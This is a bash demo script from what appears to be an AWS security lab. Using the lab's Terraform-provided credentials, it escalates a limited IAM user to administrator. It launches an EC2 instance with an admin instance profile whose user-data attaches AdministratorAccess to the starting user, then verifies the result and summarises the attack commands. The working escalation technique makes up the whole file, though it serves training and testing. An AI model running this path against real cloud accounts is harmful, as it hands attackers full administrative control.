#!/bin/bash

# Demo script for iam:PassRole + ec2:RunInstances privilege escalation
# This script demonstrates how a role with PassRole and RunInstances can escalate to admin


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-ec2-001-to-admin-starting-user"
ADMIN_ROLE="pl-prod-ec2-001-to-admin-target-role"
INSTANCE_PROFILE="pl-prod-ec2-001-to-admin-instance-profile"
DEMO_INSTANCE_TAG="pl-ec2-001-to-admin-demo-instance"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + EC2 RunInstances Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_ec2_001_iam_passrole_ec2_runinstances.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Check current permissions (should be limited)
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Prepare user-data script to grant admin access
echo -e "${YELLOW}Step 5: Preparing EC2 user-data script to grant admin access${NC}"
echo "This script will attach AdministratorAccess policy to the starting user"

# Create user-data script
USER_DATA=$(cat <<EOF
#!/bin/bash
exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
echo "Starting privilege escalation script..."

STARTING_USER_NAME="${STARTING_USER}"

# Wait for IAM role to be available
sleep 10

# Attach AdministratorAccess policy to the starting user
aws iam attach-user-policy \
  --user-name \$STARTING_USER_NAME \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

echo "AdministratorAccess attached to \$STARTING_USER_NAME successfully"
EOF
)

# Base64 encode user-data for safe passing
USER_DATA_B64=$(echo "$USER_DATA" | base64)

echo -e "${GREEN}✓ User-data script prepared${NC}\n"

# [OBSERVATION] Step 6: Get AMI ID for EC2 instance
echo -e "${YELLOW}Step 6: Finding Amazon Linux 2023 AMI${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws ec2 describe-images --region $AWS_REGION --owners amazon --filters \"Name=name,Values=al2023-ami-2023.*-x86_64\" \"Name=state,Values=available\" --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text"
AMI_ID=$(aws ec2 describe-images \
    --region $AWS_REGION \
    --owners amazon \
    --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" \
    --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
    --output text)

if [ -z "$AMI_ID" ] || [ "$AMI_ID" = "None" ]; then
    echo -e "${YELLOW}Could not find Amazon Linux 2023 AMI, trying Amazon Linux 2...${NC}"
    AMI_ID=$(aws ec2 describe-images \
        --region $AWS_REGION \
        --owners amazon \
        --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" "Name=state,Values=available" \
        --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
        --output text)
fi

if [ -z "$AMI_ID" ] || [ "$AMI_ID" = "None" ]; then
    echo -e "${RED}Error: Could not find suitable AMI${NC}"
    exit 1
fi

echo "Using AMI: $AMI_ID"
echo -e "${GREEN}✓ Found AMI${NC}\n"

# [OBSERVATION] Step 7a: Discover default VPC and subnet
echo -e "${YELLOW}Step 7: Launching EC2 instance with admin instance profile${NC}"
echo "This is the privilege escalation vector - passing the admin role to EC2..."
echo "Instance profile: $INSTANCE_PROFILE"

# Get default VPC and subnet using readonly creds
show_cmd "ReadOnly" "aws ec2 describe-vpcs --region $AWS_REGION --filters \"Name=is-default,Values=true\" --query 'Vpcs[0].VpcId' --output text"
DEFAULT_VPC=$(aws ec2 --region $AWS_REGION describe-vpcs --filters "Name=is-default,Values=true" --query 'Vpcs[0].VpcId' --output text)

if [ "$DEFAULT_VPC" = "None" ] || [ -z "$DEFAULT_VPC" ]; then
    echo -e "${RED}Error: No default VPC found. This demo requires a default VPC.${NC}"
    echo "Please create a default VPC or modify the script to use a specific VPC."
    exit 1
fi

show_cmd "ReadOnly" "aws ec2 describe-subnets --region $AWS_REGION --filters \"Name=vpc-id,Values=$DEFAULT_VPC\" --query 'Subnets[0].SubnetId' --output text"
DEFAULT_SUBNET=$(aws --region $AWS_REGION ec2 describe-subnets --filters "Name=vpc-id,Values=$DEFAULT_VPC" --query 'Subnets[0].SubnetId' --output text)

echo "Using VPC: $DEFAULT_VPC"
echo "Using Subnet: $DEFAULT_SUBNET"
echo "Using Region: $AWS_REGION"

# [EXPLOIT] Launch EC2 instance with admin role
use_starting_creds
show_attack_cmd "Attacker" "aws ec2 run-instances --region $AWS_REGION --image-id $AMI_ID --instance-type t3.micro --iam-instance-profile Name=$INSTANCE_PROFILE --user-data \"$USER_DATA\" --subnet-id $DEFAULT_SUBNET --tag-specifications \"ResourceType=instance,Tags=[{Key=Name,Value=$DEMO_INSTANCE_TAG},{Key=Environment,Value=demo}]\" --query 'Instances[0].InstanceId' --output text"
INSTANCE_ID=$(aws ec2 run-instances \
    --region $AWS_REGION \
    --image-id $AMI_ID \
    --instance-type t3.micro \
    --iam-instance-profile Name=$INSTANCE_PROFILE \
    --user-data "$USER_DATA" \
    --subnet-id $DEFAULT_SUBNET \
    --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=$DEMO_INSTANCE_TAG},{Key=Environment,Value=demo}]" \
    --query 'Instances[0].InstanceId' \
    --output text)

if [ -z "$INSTANCE_ID" ]; then
    echo -e "${RED}Error: Failed to launch EC2 instance${NC}"
    exit 1
fi

echo "Instance ID: $INSTANCE_ID"
echo -e "${GREEN}✓ EC2 instance launched successfully${NC}\n"

# [OBSERVATION] Step 8: Wait for policy attachment to complete
echo -e "${YELLOW}Step 8: Waiting for user-data script to attach AdministratorAccess${NC}"
echo "This may take 2-3 minutes while the instance starts and executes the script..."
echo ""
use_readonly_creds

MAX_WAIT=300  # 5 minutes
WAIT_TIME=0
POLICY_ATTACHED=false

while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    # Check if AdministratorAccess is attached to the starting user
    ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[?PolicyName==`AdministratorAccess`].PolicyName' --output text 2>/dev/null || echo "")

    if [ "$ATTACHED_POLICIES" == "AdministratorAccess" ]; then
        echo -e "${GREEN}✓ Policy attachment complete! AdministratorAccess attached to starting user${NC}\n"
        POLICY_ATTACHED=true
        break
    fi

    echo -n "."
    sleep 10
    WAIT_TIME=$((WAIT_TIME + 10))
done

echo ""

if [ "$POLICY_ATTACHED" = false ]; then
    echo -e "${RED}Error: Policy attachment did not complete within timeout${NC}"
    echo "Instance ID: $INSTANCE_ID"
    echo "You may need to check the instance logs or increase the timeout"
    exit 1
fi

# [OBSERVATION] Step 9: Verify admin access
echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
echo "The starting user now has AdministratorAccess attached..."
echo "Attempting to list IAM users..."
use_readonly_creds

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole + ec2:RunInstances)"
echo "2. Launched EC2 instance with admin instance profile ($ADMIN_ROLE)"
echo "3. EC2 instance attached AdministratorAccess policy to starting user via user-data"
echo "4. Achieved: Administrator Access (directly on starting user)"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (PassRole + RunInstances) → EC2 with $ADMIN_ROLE"
echo -e "  → (AttachUserPolicy AdministratorAccess) → $STARTING_USER → Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- EC2 Instance: $INSTANCE_ID"
echo "- AdministratorAccess policy attached to: $STARTING_USER"

echo -e "\n${RED}⚠ Warning: AdministratorAccess policy has been attached to the starting user${NC}"
echo -e "${RED}⚠ The EC2 instance is still running and incurring charges${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
